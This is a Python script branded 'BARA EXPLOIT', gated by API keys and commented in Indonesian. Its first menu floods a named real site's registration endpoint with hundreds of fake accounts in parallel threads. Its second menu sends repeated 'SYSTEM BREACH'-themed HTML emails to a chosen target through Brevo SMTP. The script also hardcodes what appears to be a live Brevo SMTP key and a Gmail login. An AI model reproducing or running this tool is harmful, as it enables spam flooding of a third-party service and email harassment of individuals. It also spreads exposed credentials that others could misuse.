import requests
import random
import string
import time
import os
import sys
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[-] Install dulu: pip install colorama requests")
    sys.exit()

# ==========================================
# KONFIGURASI
# ==========================================
NOVA_URL = "https://nova-wawa.vercel.app/api/register"
USED_KEYS_FILE = "used_keys.txt"

# KONFIGURASI BREVO SMTP (SESUAI PUNYA LO)
BREVO_SMTP_SERVER = "smtp-relay.brevo.com"
BREVO_SMTP_PORT = 587
BREVO_SMTP_LOGIN = "ttingg48@gmail.com" 
BREVO_SMTP_PASSWORD = "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" 
PENGIRIM_EMAIL = "ttingg48@gmail.com" 

# Warna ANSI RGB
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_BLUE = '\033[94m'
C_MAGENTA = '\033[95m'
C_CYAN = '\033[96m'
C_WHITE = '\033[97m'
C_RESET = '\033[0m'
C_BOLD = '\033[1m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def animasi_banner():
    ascii_art = [
        "██████╗  █████╗ ██████╗  █████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗",
        "██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
        "██████╔╝███████║██████╔╝███████║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ",
        "██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ",
        "██████╔╝██║  ██║██║  ██║██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ",
        "╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
    ]
    colors = [C_RED, C_YELLOW, C_GREEN, C_CYAN, C_BLUE, C_MAGENTA]
    for shift in range(15):
        clear()
        print("\n")
        for i, line in enumerate(ascii_art):
            color_idx = (i + shift) % len(colors)
            print(f"{colors[color_idx]}{C_BOLD}{line}{C_RESET}")
        print(f"\n{C_WHITE}                        [ PREMIUM TOOLKING V3 ]{C_RESET}")
        print(f"{C_WHITE}                              Dev: BARA{C_RESET}\n")
        time.sleep(0.05)

def get_decrypted_keys():
    try:
        with open("apikey.js", "r", encoding="utf-8") as f:
            content = f.read()
        keys = re.findall(r'"([^"]+)"', content)
        return [k for k in keys if "bara" in k or "vip" in k]
    except:
        return []

# ==========================================
# MENU 1: SPAM LOGIN (NOVA WAWA)
# ==========================================
def tembak_register():
    rand_str = ''.join(random.choices(string.ascii_lowercase, k=4))
    timestamp = int(time.time() * 1000) 
    prefix = random.choice(["User", "VIP", "Siswa", "Member", "Baru", "Bara", "Anon"])
    nama = f"{prefix}_{rand_str}"
    password = f"Qwerty{random.randint(100, 999)}!"
    
    payload = {
        "full_name": nama,
        "birth_year": str(random.randint(1990, 2006)),
        "email": f"{nama.lower()}_{timestamp}@gmail.com",
        "password": password,
        "agree": True
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Origin": "https://nova-wawa.vercel.app"
    }
    try:
        res = requests.post(NOVA_URL, json=payload, headers=headers, timeout=5)
        return res.status_code in [200, 201]
    except:
        return False

def eksekusi_spam_login():
    clear()
    print(f"{C_CYAN}=== SPAM LOGIN NOVA WAWA ==={C_RESET}")
    try:
        jumlah = int(input(f"{C_YELLOW}Masukkan jumlah spam (max 500): {C_RESET}"))
    except:
        return
    
    print(f"\n{C_YELLOW}[*] Menyiapkan {jumlah} akun...{C_RESET}")
    start_time = time.time()
    sukses = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(tembak_register) for _ in range(jumlah)]
        for i, f in enumerate(futures):
            if f.result(): sukses += 1
            percent = int((i + 1) / jumlah * 100)
            sys.stdout.write(f"\r{C_GREEN}[Progress] {percent}% ({sukses} Sukses){C_RESET}")
            sys.stdout.flush()
            
    elapsed = time.time() - start_time
    print(f"\n\n{C_GREEN}[✅] SELESAI! Sukses: {sukses} | Gagal: {jumlah - sukses} | Waktu: {elapsed:.2f}s{C_RESET}")
    input(f"\n{C_CYAN}Tekan Enter buat balik...{C_RESET}")

# ==========================================
# MENU 2: SPAM EMAIL (BREVO SMTP + UI HACKER)
# ==========================================
def kirim_email_brevo(target, pesan):
    # UI HTML VIBECODE HACKER THEME + GAMBAR + AUDIO TOGGLE
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@700;900&display=swap');
            
            body {{ 
                margin: 0; padding: 40px 20px; 
                font-family: 'Fira Code', monospace; 
                background-color: #050505;
                background-image: 
                    linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
                background-size: 20px 20px;
                color: #00ff41;
                min-height: 100vh; display: flex; justify-content: center; align-items: center;
            }}
            
            .card {{ 
                background: rgba(10, 10, 10, 0.9); 
                border: 2px solid #00ff41;
                box-shadow: 0 0 20px rgba(0, 255, 65, 0.3), inset 0 0 20px rgba(0, 255, 65, 0.1);
                padding: 30px; border-radius: 12px; 
                max-width: 500px; width: 100%; text-align: center; 
                position: relative;
            }}
            
            .glitch-text {{
                font-family: 'Orbitron', sans-serif;
                font-size: 28px; font-weight: 900;
                color: #ff003c;
                text-transform: uppercase;
                letter-spacing: 2px;
                text-shadow: 2px 2px 0px #00ff41, -2px -2px 0px #00b0ff;
                margin-bottom: 20px;
            }}
            
            .gambar {{
                width: 100%;
                max-height: 200px;
                object-fit: cover;
                border-radius: 8px;
                border: 1px solid #00ff41;
                margin-bottom: 20px;
                filter: grayscale(20%) contrast(120%);
            }}
            
            .pesan-box {{
                background: rgba(0, 255, 65, 0.1);
                border-left: 4px solid #00ff41;
                padding: 15px;
                text-align: left;
                margin-bottom: 25px;
                font-size: 15px;
                color: #fff;
            }}
            
            /* Tombol Audio Tanpa JS */
            details {{
                margin-bottom: 20px;
                text-align: left;
            }}
            summary {{
                background: #111;
                border: 1px solid #00ff41;
                color: #00ff41;
                padding: 10px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: bold;
                text-align: center;
                user-select: none;
            }}
            summary:hover {{ background: #1a1a1a; }}
            audio {{ width: 100%; margin-top: 10px; outline: none; filter: invert(1); }}
            
            .footer {{ 
                font-size: 11px; color: #555; text-transform: uppercase;
                letter-spacing: 2px; margin-top: 30px;
                border-top: 1px dashed #333; padding-top: 15px;
            }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="glitch-text">SYSTEM BREACH</div>
            
            <img src="https://files.catbox.moe/n04bax.png" class="gambar" alt="Bara Exploit">
            
            <div class="pesan-box">
                <span style="color: #ff003c;">>_ </span> {pesan}
            </div>
            
            <details>
                <summary>🔊 TEKAN UNTUK BUKA AUDIO</summary>
                <audio controls loop>
                    <source src="https://files.catbox.moe/6xi33i.mp3" type="audio/mpeg">
                    Browser lo nggak support audio.
                </audio>
            </details>
            
            <div class="footer">DEV: BARA | BARA EXPLOIT TOOLKING</div>
        </div>
    </body>
    </html>
    """

    msg = MIMEMultipart()
    msg['From'] = PENGIRIM_EMAIL
    msg['To'] = target
    msg['Subject'] = f"⚠️ SYSTEM ALERT {random.randint(100, 999)}"

    msg.attach(MIMEText(html_content, 'html'))

    try:
        server = smtplib.SMTP(BREVO_SMTP_SERVER, BREVO_SMTP_PORT)
        server.starttls()
        server.login(BREVO_SMTP_LOGIN, BREVO_SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        # Kalo error, print di console biar ketauan (opsional)
        # print(f"[-] Error SMTP: {e}")
        return False

def eksekusi_spam_email():
    clear()
    print(f"{C_CYAN}=== SPAM EMAIL (BREVO SMTP) ==={C_RESET}")
    target = input(f"{C_YELLOW}Masukkan Email Target (Gmail): {C_RESET}")
    pesan = input(f"{C_YELLOW}Masukkan Pesan (contoh: BaraGanteng Jangan Dilawan): {C_RESET}")
    try:
        jumlah = int(input(f"{C_YELLOW}Mau spam berapa kali?: {C_RESET}"))
    except:
        return

    print(f"\n{C_YELLOW}[*] Memproses spam email ke {target}...{C_RESET}")
    sukses = 0
    
    for i in range(1, jumlah + 1):
        if kirim_email_brevo(target, pesan):
            sukses += 1
            print(f"{C_GREEN}[✅] [{i}/{jumlah}] Terkirim!{C_RESET}")
        else:
            print(f"{C_RED}[❌] [{i}/{jumlah}] Gagal (Cek SMTP Brevo lo).{C_RESET}")
            
        time.sleep(1.5) # Jeda wajib biar ga diblokir Brevo
        
    print(f"\n{C_GREEN}[✅] Selesai! Sukses: {sukses}/{jumlah}{C_RESET}")
    input(f"\n{C_CYAN}Tekan Enter buat balik...{C_RESET}")

# ==========================================
# MAIN MENU
# ==========================================
def main():
    animasi_banner()
    
    valid_keys = get_decrypted_keys()
    if not valid_keys:
        print(f"{C_RED}[❌] File apikey.js nggak ketemu!{C_RESET}")
        sys.exit()

    print(f"{C_YELLOW}Masukkan API Key lo: {C_RESET}")
    user_key = input("> ").strip()

    if user_key not in valid_keys:
        print(f"\n{C_RED}[❌] API KEY TIDAK VALID! Akses Ditolak.{C_RESET}")
        sys.exit()

    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, "r") as f:
            if user_key in f.read().splitlines():
                print(f"\n{C_RED}[❌] API KEY SUDAH DIPAKAI! Key hangus.{C_RESET}")
                sys.exit()

    with open(USED_KEYS_FILE, "a") as f:
        f.write(user_key + "\n")
        
    print(f"{C_GREEN}[✅] API KEY VALID!{C_RESET}")
    time.sleep(1)

    while True:
        clear()
        m_colors = [C_CYAN, C_MAGENTA, C_GREEN]
        m_c = m_colors[int(time.time()) % 3]
        
        print(f"""{m_c}
======================================================
                BARA EXPLOIT - MAIN MENU
======================================================
{C_YELLOW}1. {C_WHITE}Spam Login (Nova Wawa)
{C_YELLOW}2. {C_WHITE}Spam Email (Brevo SMTP + Vibecode UI)
{C_YELLOW}0. {C_WHITE}Keluar
{m_c}======================================================
{C_WHITE}Dev: BARA | API Key: {user_key[:5]}***{C_RESET}""")
        
        pilihan = input(f"{C_YELLOW}Pilih menu (0-2): {C_RESET}").strip()

        if pilihan == '1':
            eksekusi_spam_login()
        elif pilihan == '2':
            eksekusi_spam_email()
        elif pilihan == '0':
            print(f"{C_RED}[!] Keluar...{C_RESET}")
            sys.exit()
        else:
            print(f"{C_RED}[!] Pilihan tidak valid!{C_RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Dihentikan sama user.{C_RESET}")
        sys.exit()
